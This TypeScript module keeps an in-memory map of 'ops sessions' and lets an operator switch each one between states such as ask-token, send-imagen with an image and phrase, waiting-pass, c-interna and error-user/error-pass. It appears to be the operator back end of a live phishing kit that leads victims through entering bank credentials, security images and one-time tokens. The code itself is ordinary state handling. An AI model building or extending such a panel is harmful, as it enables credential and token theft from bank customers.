import type { OpsSession, OpsSessionState } from "./ops-channel";

type OpsStore = {
  sessions: Map<string, OpsSession>;
};

const globalForOps = globalThis as typeof globalThis & {
  __baOpsStore?: OpsStore;
};

function store(): OpsStore {
  if (!globalForOps.__baOpsStore) {
    globalForOps.__baOpsStore = { sessions: new Map() };
  }
  return globalForOps.__baOpsStore;
}

export function listOpsSessions(): OpsSession[] {
  return [...store().sessions.values()].sort(
    (a, b) => (a.createdAt || 0) - (b.createdAt || 0),
  );
}

export function getOpsSession(id: string): OpsSession | null {
  return store().sessions.get(id) ?? null;
}

export function upsertOpsSessionServer(
  session: OpsSession,
): OpsSession {
  const existing = store().sessions.get(session.id);
  const now = Date.now();
  const next: OpsSession = existing
    ? {
        ...existing,
        ...session,
        updatedAt: now,
        last_seen: session.last_seen ?? now,
      }
    : {
        ...session,
        createdAt: session.createdAt || now,
        updatedAt: now,
        last_seen: session.last_seen ?? now,
      };
  store().sessions.set(next.id, next);
  return next;
}

export function patchOpsSessionServer(
  id: string,
  patch: Partial<OpsSession>,
): OpsSession | null {
  const existing = store().sessions.get(id);
  if (!existing) return null;
  const now = Date.now();
  const next: OpsSession = {
    ...existing,
    ...patch,
    id: existing.id,
    updatedAt: now,
    last_seen: patch.last_seen ?? now,
  };
  store().sessions.set(id, next);
  return next;
}

export function applyOpsActionServer(
  id: string,
  action: string,
  extra?: { imageSrc?: string; phrase?: string },
): OpsSession | null {
  const existing = store().sessions.get(id);
  if (!existing) return null;

  let state: OpsSessionState = existing.state;
  if (action === "ask-token") state = "token";
  else if (action === "send-imagen") state = "imagen";
  else if (action === "waiting-imagen") state = "waiting-imagen";
  else if (action === "waiting-pass") state = "waiting-pass";
  else if (action === "c-interna") state = "c-interna";
  else if (action === "error-token") state = "error-token";
  else if (action === "error-user") state = "error-user";
  else if (action === "error-pass") state = "error-pass";
  else if (action === "error-tejuino") state = "error-tejuino";
  else if (action === "done") state = "done";

  return patchOpsSessionServer(id, {
    state,
    imageSrc: extra?.imageSrc ?? existing.imageSrc,
    phrase: extra?.phrase ?? existing.phrase,
  });
}

export function clearOpsSessionsServer() {
  store().sessions.clear();
}
